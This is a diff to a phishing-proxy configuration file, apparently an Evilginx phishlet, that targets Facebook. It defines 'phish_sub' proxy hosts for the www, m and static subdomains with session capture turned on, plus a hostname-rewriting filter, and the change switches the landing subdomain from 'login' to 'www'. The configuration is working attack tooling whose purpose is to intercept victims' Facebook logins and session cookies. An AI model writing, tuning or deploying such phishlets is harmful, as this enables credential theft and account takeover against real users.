@@ -3,9 +3,9 @@ author: 'Anon0369G'
 redirect_url: 'https://www.facebook.com/'  # Redirect after login
 
 proxy_hosts:
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
-  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
 
 sub_filters:
   - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
